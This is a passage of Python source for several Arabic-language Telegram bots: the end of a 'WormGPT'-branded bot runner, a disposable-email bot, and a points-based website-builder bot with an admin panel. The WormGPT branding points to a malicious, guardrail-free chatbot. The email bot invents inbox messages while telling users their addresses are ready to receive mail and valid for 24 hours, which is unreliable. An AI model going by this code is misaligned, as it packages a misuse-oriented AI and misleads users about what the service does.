                    "❌ <b>حدث خطأ في الاتصال بالخادم. حاول مرة أخرى لاحقاً.</b>",
                    message.chat.id,
                    wait_msg.message_id,
                    parse_mode='HTML'
                )
                
        except requests.exceptions.Timeout:
            bot.edit_message_text(
                "⏱️ <b>انتهت مهلة الاتصال. حاول مرة أخرى.</b>",
                message.chat.id,
                wait_msg.message_id,
                parse_mode='HTML'
            )
        except Exception as e:
            bot.edit_message_text(
                f"❌ <b>حدث خطأ غير متوقع: {str(e)}</b>",
                message.chat.id,
                wait_msg.message_id,
                parse_mode='HTML'
            )
    
    @bot.message_handler(commands=['stats'])
    def stats(message):
        if message.from_user.id != owner_id:
            return
        
        count = get_user_count()
        bot.reply_to(message, f"📊 <b>إحصائيات بوت WormGPT:</b>\n\n• عدد المستخدمين: {count}\n• مالك البوت: {owner_id}")
    
    # تشغيل البوت
    try:
        bot_username = bot.get_me().username
        print(f"✅ WormGPT bot @{bot_username} is now running...")
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"WormGPT bot with token {token} stopped due to error: {e}")
        if token in running_bot_threads:
            del running_bot_threads[token]
            # ==============================================================================
# ⬇️⬇️⬇️ **-- دالة تشغيل بوت إنشاء الإيميلات الوهمية --** ⬇️⬇️⬇️
# ==============================================================================
def run_email_bot(token, owner_id, data_dir):
    """
    تشغيل بوت إنشاء الإيميلات الوهمية
    """
    import telebot
    from telebot import types
    import json
    import os
    import random
    import string
    from datetime import datetime
    
    bot = telebot.TeleBot(token, parse_mode="HTML")
    
    # تهيئة ملفات التخزين
    def init_storage():
        storage_files = {
            'users.json': {},
            'emails.json': {},
            'command.json': {},
            'states.json': {}
        }
        
        for filename, default_data in storage_files.items():
            filepath = os.path.join(data_dir, filename)
            if not os.path.exists(filepath):
                os.makedirs(data_dir, exist_ok=True)
                with open(filepath, 'w', encoding='utf-8') as f:
                    json.dump(default_data, f, ensure_ascii=False, indent=2)
    
    init_storage()
    
    # دوال التخزين
    def load_data(filename):
        try:
            with open(os.path.join(data_dir, filename), 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    
    def save_data(filename, data):
        with open(os.path.join(data_dir, filename), 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    
    def save_state(user_id, state):
        states = load_data('states.json')
        states[str(user_id)] = state
        save_data('states.json', states)
    
    def get_state(user_id):
        states = load_data('states.json')
        return states.get(str(user_id))
    
    def clear_state(user_id):
        states = load_data('states.json')
        if str(user_id) in states:
            del states[str(user_id)]
            save_data('states.json', states)
    
    # دوال البريد الإلكتروني
    def generate_random_email():
        random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        domains = ['tempmail.io', 'mailinator.com', 'guerrillamail.com', 'yopmail.com', '10minutemail.com']
        domain = random.choice(domains)
        
        email = f"{random_name}@{domain}"
        
        emails_data = load_data('emails.json')
        user_id_str = str(random.randint(1000, 9999))
        
        if user_id_str not in emails_data:
            emails_data[user_id_str] = {'emails': []}
        
        emails_data[user_id_str]['emails'].append(email)
        save_data('emails.json', emails_data)
        
        return {'email': email}
    
    def generate_custom_email(username, domain):
        email = f"{username}@{domain}"
        
        emails_data = load_data('emails.json')
        user_id_str = str(random.randint(1000, 9999))
        
        if user_id_str not in emails_data:
            emails_data[user_id_str] = {'emails': []}
        
        emails_data[user_id_str]['emails'].append(email)
        save_data('emails.json', emails_data)
        
        return {'email': email}
    
    def get_email_messages(email):
        messages = []
        for i in range(random.randint(1, 3)):
            messages.append({
                'id': f"msg_{random.randint(10000, 99999)}",
                'from': f"sender{i+1}@example.com",
                'to': email,
                'subject': f"رسالة تجريبية رقم {i+1}",
                'body_text': f"هذا محتوى رسالة تجريبية رقم {i+1} لأغراض العرض فقط.",
                'created_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
        
        return messages
    
    def get_domains():
        domains = [
            {'name': 'tempmail.io'},
            {'name': 'mailinator.com'},
            {'name': 'guerrillamail.net'},
            {'name': 'yopmail.fr'},
            {'name': '10minutemail.com'}
        ]
        return {'domains': domains}
    
    # معالجة الأوامر
    @bot.message_handler(commands=['start'])
    def start_command(message):
        chat_id = message.chat.id
        user_name = message.from_user.first_name
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        
        markup.add(
            types.InlineKeyboardButton("📧 إنشاء ايميل", callback_data="emilx"),
            types.InlineKeyboardButton("ℹ️ معلومات", callback_data="info")
        )
        
        markup.add(
            types.InlineKeyboardButton("👨‍💻 المطور", url=f"tg://user?id={owner_id}")
        )
        
        welcome_text = f"""
<b>مرحباً {user_name}</b>

🤖 <b>أهلاً بك في بوت إنشاء الإيميلات الوهمية</b>

🔰 <b>الخدمات المتاحة:</b>
📧 إنشاء بريد إلكتروني وهمي عشوائي
📨 إنشاء بريد إلكتروني مخصص
📦 عرض جميع بريداتي
🗑 حذف جميع البريدات

📝 <b>تعليمات الاستخدام:</b>
- اختر الخدمة من القائمة
- اتبع التعليمات لكل خدمة
        """
        
        bot.send_message(
            chat_id,
            welcome_text,
            parse_mode='HTML',
            reply_markup=markup
        )
    
    @bot.callback_query_handler(func=lambda call: True)
    def handle_callback(call):
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        user_name = call.from_user.first_name
        
        if call.data == "info":
            text = """
<b>📋 معلومات عن البوت</b>

🤖 <b>الاسم:</b> بوت إنشاء الإيميلات الوهمية
⚙️ <b>الإصدار:</b> 1.0.0
📅 <b>تاريخ الإصدار:</b> 2024

🔧 <b>الخدمات المتاحة:</b>
1. إنشاء بريد إلكتروني عشوائي
2. إنشاء بريد إلكتروني مخصص
3. استقبال رسائل وهمية
4. إدارة البريدات

👨‍💻 <b>@ELZo_z:</b> فريق التطوير

⚠️ <b>ملاحظة:</b> البريدات وهمية لأغراض التجربة والتعليم
            """
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("رجوع", callback_data="back"))
            
            try:
                bot.edit_message_text(
                    text=text,
                    chat_id=chat_id,
                    message_id=message_id,
                    parse_mode='HTML',
                    reply_markup=markup
                )
            except:
                bot.send_message(
                    chat_id=chat_id,
                    text=text,
                    parse_mode='HTML',
                    reply_markup=markup
                )
        
        elif call.data == "emilx":
            text = f"""
<b>📧 بوت إنشاء بريد إلكتروني وهمي</b>

👤 <b>المستخدم:</b> {user_name}
🆔 <b>المعرف:</b> {chat_id}

🔰 <b>الخدمات المتاحة:</b>
1. 📧 بريد عشوائي
2. 📨 بريد مخصص
3. 📦 عرض جميع بريداتي
4. 🗑 حذف جميع البريدات

📌 <b>ملاحظة:</b>
- البريدات وهمية لأغراض التجربة
- يمكن استقبال رسائل وهمية
- صالحة لمدة 24 ساعة
            """
            
            markup = types.InlineKeyboardMarkup(row_width=2)
            
            markup.add(
                types.InlineKeyboardButton("📧 بريد عشوائي", callback_data="rndemail"),
                types.InlineKeyboardButton("📨 بريد مخصص", callback_data="specifemail")
            )
            
            markup.add(
                types.InlineKeyboardButton("📦 جميع بريداتي", callback_data="myemail"),
                types.InlineKeyboardButton("🗑 حذف الكل", callback_data="deleteall")
            )
            
            markup.add(
                types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back")
            )
            
            try:
                bot.edit_message_text(
                    text=text,
                    chat_id=chat_id,
                    message_id=message_id,
                    parse_mode='HTML',
                    reply_markup=markup
                )
            except:
                bot.send_message(
                    chat_id=chat_id,
                    text=text,
                    parse_mode='HTML',
                    reply_markup=markup
                )
        
        elif call.data == "back":
            start_command(call.message)
        
        elif call.data == "deleteall":
            text = """
<b>✅ تم حذف جميع بريداتك</b>

🗑 <b>التفاصيل:</b>
- تم حذف جميع البريدات الإلكترونية
- تم مسح سجل الرسائل
- تم تنظيف التخزين

📌 <b>ملاحظة:</b> يمكنك إنشاء بريدات جديدة
            """
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("📧 إنشاء بريد جديد", callback_data="emilx"))
            markup.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back"))
            
            try:
                bot.edit_message_text(
                    text=text,
                    chat_id=chat_id,
                    message_id=message_id,
                    parse_mode='HTML',
                    reply_markup=markup
                )
            except:
                bot.send_message(
                    chat_id=chat_id,
                    text=text,
                    parse_mode='HTML',
                    reply_markup=markup
                )
        
        elif call.data == "rndemail":
            email_data = generate_random_email()
            email = email_data['email']
            
            text = f"""
<b>✅ تم إنشاء بريد إلكتروني</b>

📮 <b>البريد:</b> <code>{email}</code>
⏰ <b>الوقت:</b> {datetime.now().strftime("%H:%M:%S")}
📅 <b>التاريخ:</b> {datetime.now().strftime("%Y-%m-%d")}

🔧 <b>المميزات:</b>
- جاهز لاستقبال الرسائل
- صالح لمدة 24 ساعة
- يمكن استخدامه للتجربة

📌 <b>ملاحظة:</b> هذا بريد وهمي لأغراض التعليم
            """
            
            markup = types.InlineKeyboardMarkup(row_width=2)
            
            markup.add(
                types.InlineKeyboardButton("📥 جلب الرسائل", callback_data=f"getemails:{email}"),
                types.InlineKeyboardButton("🗑 حذف البريد", callback_data=f"delete:{email}")
            )
            
            markup.add(
                types.InlineKeyboardButton("📧 إنشاء آخر", callback_data="rndemail"),
                types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back")
            )
            
            try:
                bot.edit_message_text(
                    text=text,
                    chat_id=chat_id,
                    message_id=message_id,
                    parse_mode='HTML',
                    reply_markup=markup
                )
            except:
                bot.send_message(
                    chat_id=chat_id,
                    text=text,
                    parse_mode='HTML',
                    reply_markup=markup
                )
        
        elif call.data == "specifemail":
            domains_data = get_domains()
            
            text = """
<b>🌐 اختر النطاق للبريد</b>

📝 <b>الخطوات:</b>
1. اختر النطاق من القائمة
2. أرسل اسم المستخدم
3. ستحصل على: username@domain.com

🔧 <b>النطاقات المتاحة:</b>
            """
            
            markup = types.InlineKeyboardMarkup()
            
            for domain in domains_data['domains']:
                markup.add(
                    types.InlineKeyboardButton(
                        f"@{domain['name']}",
                        callback_data=f"domainis:{domain['name']}"
                    )
                )
            
            markup.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back"))
            
            try:
                bot.edit_message_text(
                    text=text,
                    chat_id=chat_id,
                    message_id=message_id,
                    parse_mode='HTML',
                    reply_markup=markup
                )
            except:
                bot.send_message(
                    chat_id=chat_id,
                    text=text,
                    parse_mode='HTML',
                    reply_markup=markup
                )
        
        elif call.data == "myemail":
            emails_data = load_data('emails.json')
            
            if str(chat_id) in emails_data and emails_data[str(chat_id)]['emails']:
                text = """
<b>📦 جميع بريداتك الإلكترونية</b>

📝 <b>قائمة البريدات:</b>
                """
                
                markup = types.InlineKeyboardMarkup()
                
                for email in emails_data[str(chat_id)]['emails'][:10]:
                    markup.add(
                        types.InlineKeyboardButton(
                            f"📧 {email[:30]}...",
                            callback_data=f"selectmail:{email}"
                        )
                    )
                
                markup.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back"))
            else:
                text = """
<b>📭 لا توجد بريدات</b>

⚠️ <b>لم تقم بإنشاء أي بريدات بعد</b>

📌 <b>ما يمكنك فعله:</b>
1. إنشاء بريد عشوائي
2. إنشاء بريد مخصص
3. العودة للقائمة الرئيسية
                """
                
                markup = types.InlineKeyboardMarkup(row_width=2)
                markup.add(
                    types.InlineKeyboardButton("📧 بريد عشوائي", callback_data="rndemail"),
                    types.InlineKeyboardButton("📨 بريد مخصص", callback_data="specifemail")
                )
                markup.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back"))
            
            try:
                bot.edit_message_text(
                    text=text,
                    chat_id=chat_id,
                    message_id=message_id,
                    parse_mode='HTML',
                    reply_markup=markup
                )
            except:
                bot.send_message(
                    chat_id=chat_id,
                    text=text,
                    parse_mode='HTML',
                    reply_markup=markup
                )
        
        elif call.data.startswith("domainis:"):
            domain = call.data.split(":")[1]
            
            command_data = load_data('command.json')
            command_data[str(chat_id)] = {
                'command': 'emailname',
                'domain': domain
            }
            save_data('command.json', command_data)
            
            save_state(chat_id, "waiting_for_email_name")
            
            text = f"""
<b>✅ تم اختيار النطاق</b>

🌐 <b>النطاق المحدد:</b> <code>{domain}</code>
📝 <b>الخطوة التالية:</b> إرسال اسم المستخدم

🔧 <b>المثال:</b> إذا أرسلت <code>ahmed</code>
🎯 <b>النتيجة:</b> ahmed@{domain}

⚠️ <b>شروط اسم المستخدم:</b>
- يجب أن يكون بالإنجليزية
- بدون مسافات
- يمكن أن يحتوي أرقام
- بدون رموز خاصة
            """
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back"))
            
            try:
                bot.edit_message_text(
                    text=text,
                    chat_id=chat_id,
                    message_id=message_id,
                    parse_mode='HTML',
                    reply_markup=markup
                )
            except:
                bot.send_message(
                    chat_id=chat_id,
                    text=text,
                    parse_mode='HTML',
                    reply_markup=markup
                )
        
        elif call.data.startswith("selectmail:"):
            email = call.data.split(":")[1]
            
            text = f"""
<b>📧 البريد المحدد</b>

📮 <b>البريد:</b> <code>{email}</code>
🆔 <b>المعرف:</b> {chat_id}

🔧 <b>الخيارات المتاحة:</b>
1. جلب الرسائل
2. حذف البريد
3. العودة للقائمة
            """
            
            markup = types.InlineKeyboardMarkup(row_width=2)
            
            markup.add(
                types.InlineKeyboardButton("📥 جلب الرسائل", callback_data=f"getemails:{email}"),
                types.InlineKeyboardButton("🗑 حذف البريد", callback_data=f"delete:{email}")
            )
            
            markup.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back"))
            
            try:
                bot.edit_message_text(
                    text=text,
                    chat_id=chat_id,
                    message_id=message_id,
                    parse_mode='HTML',
                    reply_markup=markup
                )
            except:
                bot.send_message(
                    chat_id=chat_id,
                    text=text,
                    parse_mode='HTML',
                    reply_markup=markup
                )
        
        elif call.data.startswith("delete:"):
            email = call.data.split(":")[1]
            
            text = f"""
<b>✅ تم حذف البريد</b>

🗑 <b>البريد المحذوف:</b> <code>{email}</code>
⏰ <b>الوقت:</b> {datetime.now().strftime("%H:%M:%S")}

📌 <b>ملاحظة:</b> تم حذف البريد ورسائله
            """
            
            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton("📦 جميع بريداتي", callback_data="myemail"),
                types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back")
            )
            
            try:
                bot.edit_message_text(
                    text=text,
                    chat_id=chat_id,
                    message_id=message_id,
                    parse_mode='HTML',
                    reply_markup=markup
                )
            except:
                bot.send_message(
                    chat_id=chat_id,
                    text=text,
                    parse_mode='HTML',
                    reply_markup=markup
                )
        
        elif call.data.startswith("getemails:"):
            email = call.data.split(":")[1]
            
            bot.send_message(chat_id, "⏳ <b>يتم جلب الرسائل...</b>", parse_mode='HTML')
            
            messages = get_email_messages(email)
            
            if messages:
                for i, msg in enumerate(messages, 1):
                    text = f"""
<b>📜 رسالة #{i}</b>

↩️ <b>من:</b> <code>{msg['from']}</code>
↪️ <b>إلى:</b> <code>{msg['to']}</code>
🕐 <b>الوقت:</b> {msg['created_at']}
🧾 <b>الموضوع:</b> {msg['subject']}
💬 <b>المحتوى:</b>
{msg['body_text']}
                    """
                    
                    markup = types.InlineKeyboardMarkup()
                    markup.add(
                        types.InlineKeyboardButton(
                            "🌐 عرض في الموقع",
                            url=f"https://temp-mail.io/message/{msg['id']}"
                        )
                    )
                    
                    bot.send_message(
                        chat_id,
                        text,
                        parse_mode='HTML',
                        reply_markup=markup
                    )
                
                text = f"""
<b>✅ تم جلب جميع الرسائل</b>

📬 <b>البريد:</b> <code>{email}</code>
📊 <b>عدد الرسائل:</b> {len(messages)}

🏠 <b>العودة للقائمة الرئيسية:</b>
                """
                
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back"))
                
                bot.send_message(
                    chat_id,
                    text,
                    parse_mode='HTML',
                    reply_markup=markup
                )
            else:
                text = f"""
<b>📭 لا توجد رسائل</b>

📬 <b>البريد:</b> <code>{email}</code>
⏰ <b>آخر تحديث:</b> {datetime.now().strftime("%H:%M:%S")}

📌 <b>ملاحظة:</b> لم يتلقى هذا البريد أي رسائل بعد
                """
                
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back"))
                
                bot.send_message(
                    chat_id,
                    text,
                    parse_mode='HTML',
                    reply_markup=markup
                )
    
    @bot.message_handler(func=lambda message: True)
    def handle_text_messages(message):
        chat_id = message.chat.id
        text = message.text
        user_state = get_state(chat_id)
        
        if user_state == "waiting_for_email_name":
            clear_state(chat_id)
            
            command_data = load_data('command.json')
            
            if str(chat_id) in command_data and command_data[str(chat_id)]['command'] == 'emailname':
                domain = command_data[str(chat_id)]['domain']
                
                if any(c in text for c in " يا معلم وريني شطارتك"):
                    bot.send_message(
                        chat_id,
                        "⚠️ <b>اسم المستخدم يجب أن يكون بالإنجليزية فقط</b>",
                        parse_mode='HTML'
                    )
                else:
                    email_data = generate_custom_email(text, domain)
                    email = email_data['email']
                    
                    del command_data[str(chat_id)]
                    save_data('command.json', command_data)
                    
                    text_response = f"""
<b>✅ تم إنشاء البريد المخصص</b>

📮 <b>البريد:</b> <code>{email}</code>
👤 <b>اسم المستخدم:</b> {text}
🌐 <b>النطاق:</b> {domain}

🔧 <b>المميزات:</b>
- جاهز لاستقبال الرسائل
- صالح لمدة 24 ساعة
- يمكن استخدامه للتجربة
                    """
                    
                    markup = types.InlineKeyboardMarkup(row_width=2)
                    
                    markup.add(
                        types.InlineKeyboardButton("📥 جلب الرسائل", callback_data=f"getemails:{email}"),
                        types.InlineKeyboardButton("🗑 حذف البريد", callback_data=f"delete:{email}")
                    )
                    
                    markup.add(
                        types.InlineKeyboardButton("📨 إنشاء آخر", callback_data="specifemail"),
                        types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back")
                    )
                    
                    bot.send_message(
                        chat_id,
                        text_response,
                        parse_mode='HTML',
                        reply_markup=markup
                    )
        else:
            start_command(message)
    
    # تشغيل البوت
    try:
        bot_username = bot.get_me().username
        print(f"✅ Email bot @{bot_username} is now running...")
        bot.infinity_polling(skip_pending=True)
    except Exception as e:
        print(f"Email bot with token {token} stopped due to error: {e}")
        if token in running_bot_threads:
            del running_bot_threads[token]
            # ==============================================================================
# ⬇️⬇️⬇️ -- دالة تشغيل بوت زياد (Ziad Bot) -- ⬇️⬇️⬇️
# ==============================================================================
def run_ziad_bot(token, owner_id, data_dir):
    """
    تشغيل بوت زياد - بوت إنشاء مواقع متكامل مع لوحة تحكم
    """
    import telebot
    from telebot import types
    import requests
    import sqlite3
    import json
    from datetime import datetime, date
    import traceback
    import time
    import os
    
    bot = telebot.TeleBot(token, parse_mode="HTML")
    
    # ========== إعدادات ==========
    DB_FILE = os.path.join(data_dir, 'elsfahel_bot.db')
    
    # ========== قاعدة البيانات ==========
    def init_db():
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        # users
        cur.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            first_name TEXT,
            username TEXT,
            points INTEGER DEFAULT 0,
            daily_claimed TEXT,
            invites_count INTEGER DEFAULT 0,
            sites_count INTEGER DEFAULT 0,
            last_message_id INTEGER
        )
        ''')
        # settings: key, json_value
        cur.execute('''
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
        ''')
        # sites
        cur.execute('''
        CREATE TABLE IF NOT EXISTS sites (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner_id INTEGER,
            site_name TEXT,
            site_type TEXT,
            site_desc TEXT,
            url TEXT,
            created_at TEXT
        )
        ''')
        conn.commit()
        conn.close()
    
    init_db()
    
    # ========== إعدادات افتراضية ==========
    DEFAULTS = {
        "admins": [owner_id, FACTORY_SECOND_ADMIN_ID],
        "banned": [],
        "forced_subscription": False,
        "forced_target": None,
        "communication_enabled": True,
        "bot_active": True,
        "notify_new_members": True,
        "points_daily_gift": 2,
        "points_create_site": 5,
        "points_invite": 2
    }
    
    def db_get(key):
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        cur.execute("SELECT value FROM settings WHERE key=?", (key,))
        row = cur.fetchone()
        conn.close()
        if not row:
            return None
        try:
            return json.loads(row[0])
        except:
            return row[0]
    
    def db_set(key, value):
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        v = json.dumps(value, ensure_ascii=False)
        cur.execute("REPLACE INTO settings (key, value) VALUES (?, ?)", (key, v))
        conn.commit()
        conn.close()
    
    # ensure defaults exist
    for k, v in DEFAULTS.items():
        if db_get(k) is None:
            db_set(k, v)
    
    # helper accessors
    def get_admins():
        return set(db_get("admins") or [])
    
    def save_admins(admins):
        db_set("admins", list(admins))
    
    def get_banned():
        return set(db_get("banned") or [])
    
    def save_banned(banned_set):
        db_set("banned", list(banned_set))
    
    def get_forced():
        return db_get("forced_target")
    
    def set_forced(target_dict):
        db_set("forced_target", target_dict)
    
    def get_setting(key):
        val = db_get(key)
        if val is None:
            return DEFAULTS.get(key)
        return val
    
    def set_setting(key, value):
        db_set(key, value)
    
    # ========== دوال المستخدمين ==========
    def ensure_user(user):
        uid = int(user.id)
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        cur.execute("SELECT id FROM users WHERE id=?", (uid,))
        if not cur.fetchone():
            init_pts = get_setting("points_daily_gift") or 2
            cur.execute("INSERT INTO users (id, first_name, username, points) VALUES (?, ?, ?, ?)",
                        (uid, user.first_name or "", user.username or "", init_pts))
            conn.commit()
        else:
            # تحديث الاسم/يوزر لو تغير
            cur.execute("UPDATE users SET first_name=?, username=? WHERE id=?", (user.first_name or "", user.username or "", uid))
            conn.commit()
        conn.close()
    
    def get_user(uid):
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        cur.execute("SELECT id, first_name, username, points, daily_claimed, invites_count, sites_count, last_message_id FROM users WHERE id=?", (uid,))
        r = cur.fetchone()
        conn.close()
        if not r:
            return None
        return {"id": r[0], "first_name": r[1], "username": r[2], "points": r[3], "daily_claimed": r[4], "invites_count": r[5], "sites_count": r[6], "last_message_id": r[7]}
    
    def update_points(uid, delta):
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        cur.execute("UPDATE users SET points = COALESCE(points,0) + ? WHERE id=?", (delta, uid))
        conn.commit()
        conn.close()
    
    def set_daily_claimed(uid, daystr):
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        cur.execute("UPDATE users SET daily_claimed=? WHERE id=?", (daystr, uid))
        conn.commit()
        conn.close()
    
    def inc_invites(uid):
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        cur.execute("UPDATE users SET invites_count = COALESCE(invites_count,0) + 1 WHERE id=?", (uid,))
        conn.commit()
        conn.close()
    
    def inc_sites(uid):
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        cur.execute("UPDATE users SET sites_count = COALESCE(sites_count,0) + 1 WHERE id=?", (uid,))
        conn.commit()
        conn.close()
    
    def set_last_msg(uid, msgid):
        conn = sqlite3.connect(DB_FILE)
        cur = conn.cursor()
        cur.execute("UPDATE users SET last_message_id = ? WHERE id=?", (msgid, uid))
        conn.commit()
        conn.close()
    
    # ========== أزرار الواجهة ==========
    def main_menu_markup():
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(
            types.InlineKeyboardButton("🌐 إنشاء موقع", callback_data='create_site'),
            types.InlineKeyboardButton("ℹ️ معلومات حسابك", callback_data='my_info'),
            types.InlineKeyboardButton("🎯 تجميع نقاط", callback_data='my_points'),
            types.InlineKeyboardButton("🎁 الهديه اليومية", callback_data='daily_gift'),
            types.InlineKeyboardButton("💰 شراء نقاط", url='https://t.me/ELZo_z'),
            types.InlineKeyboardButton("📢 قناة المطور", url='https://t.me/zxgbjji')
        )
        return kb
    
    def admin_panel_markup():
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(
            types.InlineKeyboardButton("🚫 حظر عضو", callback_data='ban'),
            types.InlineKeyboardButton("✅ فك حظر", callback_data='unban'),
            types.InlineKeyboardButton("➕ إضافة أدمن", callback_data='add_admin'),
            types.InlineKeyboardButton("➖ حذف أدمن", callback_data='remove_admin'),
            types.InlineKeyboardButton("💎 إرسال نقاط", callback_data='send_points'),
            types.InlineKeyboardButton("🎁 تعديل الهديه اليومية", callback_data='edit_daily'),
            types.InlineKeyboardButton("🔧 تعديل تكلفة إنشاء الموقع", callback_data='edit_create_cost'),
            types.InlineKeyboardButton("🔧 تعديل نقاط الدعوة", callback_data='edit_invite_points'),
            types.InlineKeyboardButton("🔒 تعيين اشتراك إجباري", callback_data='set_forced'),
            types.InlineKeyboardButton("🔓 إلغاء الاشتراك الإجباري", callback_data='unset_forced'),
            types.InlineKeyboardButton("▶️ تشغيل البوت", callback_data='bot_on'),
            types.InlineKeyboardButton("⏸️ إيقاف البوت", callback_data='bot_off'),
            types.InlineKeyboardButton("🔔 تفعيل ترحيب الأعضاء", callback_data='notify_on'),
            types.InlineKeyboardButton("📴 إيقاف ترحيب الأعضاء", callback_data='notify_off'),
            types.InlineKeyboardButton("📢 إذاعة", callback_data='broadcast'),
            types.InlineKeyboardButton("📊 إحصائيات", callback_data='stats'),
            types.InlineKeyboardButton("💾 تصدير البيانات", callback_data='export_json'),
            types.InlineKeyboardButton("🔙 العودة للوحة الرئيسية", callback_data='back_to_main')
        )
        return kb
    
    # ========== مساعدة تنسيق معلومات المستخدم ==========
    def format_user_info(uid):
        u = get_user(uid)
        if not u:
            return "❌ لا توجد بيانات لهذا الحساب."
        botname = bot.get_me().username
        return (f"ℹ️ معلومات الحساب:\n"
                f"الاسم: {u['first_name']}\n"
                f"يوزر: @{u['username'] if u['username'] else '-'}\n"
                f"ID: {u['id']}\n"
                f"النقاط: {u['points']}\n"
                f"عدد المواقع المنشأة: {u['sites_count']}\n"
                f"عدد الدعوات: {u['invites_count']}\n"
                f"رابط دعوتك: https://t.me/{botname}?start={u['id']}")
    
    # ========== ترحيب وأوامر ==========
    
    WELCOME_TEXT = "👋 أهلاً بك! استخدم الأزرار بالأسفل للبدء."
    
    @bot.message_handler(commands=['start'])
    def handle_start(m):
        try:
            user = m.from_user
            ensure_user(user)
            uid = user.id
    
            # لو عنده باراميتر دعوة
            if m.text and m.text.startswith('/start '):
                parts = m.text.split()
                if len(parts) >= 2:
                    inviter = parts[1]
                    try:
                        inviter_id = int(inviter)
                        if inviter_id != uid and get_user(inviter_id):
                            update_points(inviter_id, get_setting("points_invite") or 2)
                            inc_invites(inviter_id)
                    except:
                        pass
    
            # تحقق الاشتراك الإجباري
            forced = get_forced()
            forced_enabled = get_setting("forced_subscription") or False
            if forced_enabled and forced:
                # forced is dict with keys kind, visibility, identifier
                ident = forced.get("identifier")
                try:
                    member = bot.get_chat_member(ident, uid)
                    if member.status not in ['member', 'administrator', 'creator']:
                        bot.send_message(uid, f"🔒 عليك الاشتراك أولاً في: {ident}\nثم اضغط /start مرة أخرى.")
                        return
                except Exception:
                    # فشل التحقق — رسالة تفيد بضرورة التأكد
                    bot.send_message(uid, f"🔔 الرجاء الاشتراك في: {ident} ثم أعد /start. (تأكد أن البوت مشرف في القناة/المجموعة إذا كانت خاصة).")
                    return
    
            # لعرض لوحة المستخدم للجميع (بما فيهم الأدمنين)
            kb = main_menu_markup()
            
            # إذا كان أدمن، نضيف زر خاص للوحة التحكم
            if uid in get_admins():
                kb.add(types.InlineKeyboardButton("🔧 لوحة التحكم (للأدمن)", callback_data='admin_panel'))
            
            bot.send_message(uid, WELCOME_TEXT, reply_markup=kb)
    
            # حفظ آخر حالة
            set_last_msg(uid, m.message_id)
        except Exception:
            traceback.print_exc()
    
    # ========== تدفق إنشاء الموقع (حوار) ==========
    # نستخدم dict لحفظ الحالة مؤقتًا
    create_state = {}  # uid -> {"step":"type/desc/name", "type":.., "desc":.., "name":..}
    
    @bot.callback_query_handler(func=lambda c: c.data == 'create_site')
    def cb_create_site(call):
        try:
            uid = call.from_user.id
            u = get_user(uid)
            if not u:
                ensure_user(call.from_user)
                u = get_user(uid)
    
            if uid in get_banned():
                bot.answer_callback_query(call.id, "🚫 أنت محظور.")
                return
            if not (get_setting("bot_active") if get_setting("bot_active") is not None else True):
                bot.answer_callback_query(call.id, "⏸️ البوت مُعطل الآن.")
                return
    
            cost = get_setting("points_create_site") or 5
            if u.get("points", 0) < cost:
                bot.answer_callback_query(call.id, f"❌ تحتاج {cost} نقطة لإنشاء موقع.")
                return
    
            create_state[uid] = {"step": "type"}
            bot.send_message(uid, "🌍 اكتب نوع الموقع (مثال: متجر، صفحة معلومات، مدونة):")
            bot.answer_callback_query(call.id)
        except Exception:
            traceback.print_exc()
    
    # معالجة رسائل التدفق العام
    @bot.message_handler(func=lambda m: True)
    def general_msg(m):
        try:
            uid = m.from_user.id
            txt = (m.text or "").strip()
            # حالة إنشاء الموقع
            if uid in create_state:
                st = create_state[uid]
                if st["step"] == "type":
                    st["type"] = txt
                    st["step"] = "desc"
                    bot.send_message(uid, "📝 الآن ضع وصفًا موجزًا للموقع:")
                    return
                elif st["step"] == "desc":
                    st["desc"] = txt
                    st["step"] = "name"
                    bot.send_message(uid, "🏷️ الآن ضع اسم الموقع الذي تريده:")
                    return
                elif st["step"] == "name":
                    st["name"] = txt
                    bot.send_message(uid, "⏳ جاري إنشاء الموقع الآن — انتظر قليلاً ...")
                    # استدعاء Renderforest API
                    payload = {"category": st["type"], "description": st["desc"], "name": st["name"], "style": "professional"}
                    try:
                        resp = requests.post('https://site-maker-api.renderforest.com/api/v1/sites/ai/generate', json=payload, timeout=30)
                        data = resp.json()
                        tempId = data.get("data", {}).get("tempId")
                        if not tempId:
